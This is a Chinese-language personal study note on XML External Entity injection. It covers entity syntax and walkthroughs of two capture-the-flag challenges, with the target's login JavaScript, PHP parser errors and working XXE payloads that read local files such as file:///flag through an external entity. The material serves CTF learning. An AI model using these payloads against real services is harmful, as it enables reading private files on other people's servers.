---
title: "xml"
date: 2026-01-21 19:39:43
categories: 默认分类
tags: [笔记]
---



![image-20251226212439507](C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251226212439507.png)



- DOCTYPE（文档类型定义的声明）
- ENTITY（实体的声明）
- SYSTEM、PUBLIC（外部资源申请）

```xml
内部实体
<!ENTITY 实体名称 "实体值">

外部实体
<!ENTITY 实体名称 SYSTEM "URL">
```









## 10 第十章 天机符阵_revenge

随便输入，得到：

```
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 1 in <b>/var/www/html/chapter10.php</b> on line <b>17</b><br />
<阵枢>引魂玉</阵枢>
<解析>未定义</解析>
<输出>未定义</输出>
```



```
<!DOCTYPE 输出 [
<!ENTITY flag SYSTEM "file:///flag.txt">]>
<输出>&flag;</输出> 
```

这里的路径和之前的题目不一样，虽然提示在/var/www/html/chapter10.php









## [NCTF2019]Fake XML cookbook

### 1

1.查看源码



```
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

源码：其中看到了xml格式

var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 



还有doLogin.php



2.打开doLogin.php

看到

```
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Empty string supplied as input in <b>/var/www/html/doLogin.php</b> on line <b>16</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/doLogin.php</b> on line <b>17</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/doLogin.php:16) in <b>/var/www/html/doLogin.php</b> on line <b>31</b><br />
<result><code>0</code><msg></msg></result>
```



| 报错内容                                                  | 人话含义                                                     | 对解题的关键提示                                           |
| --------------------------------------------------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |
| `Empty string supplied as input`                          | 核心问题：XML 解析器（DOMDocument）接收到的输入是**空字符串**（什么都没传） | 你提交的参数为空 / 提交方式错误，导致服务器没收到 XML 内容 |
| `simplexml_import_dom(): Invalid Nodetype to import`      | 连锁问题：因为输入为空，解析出的 DOM 节点无效，无法转成 SimpleXML 对象 | 不是 XML 格式错，是 “根本没传 XML”                         |
| `Cannot modify header information - headers already sent` | 次要问题：报错信息先输出到页面，后续代码想改 HTTP 头（比如跳转 / 返回 JSON）失败 | 这是无关紧要的连锁错误，解决核心问题后会自动消失           |
| `<result><code>0</code><msg></msg></result>`              | 服务器返回的最终结果：`code=0`表示操作失败，`msg`为空        | 验证了服务器没处理到有效内容，直接返回失败                 |

期待你用抓包传值



3.构造

file:///flag

<user><username>username</username><password>password</password></user>

注意格式：&flag;

`&xxx;`是 XML 中**实体引用的专属格式**（相当于 “变量调用”），而`123`是**普通文本**（直接写的固定值），只有 “调用变量” 时才需要`&`和`;`，写固定值时直接写就行。





payload:

```
<!DOCTYPE 输出 [
<!ENTITY flag SYSTEM "file:///flag">]>
<user><username>&flag;</username><password>123</password></user>
```





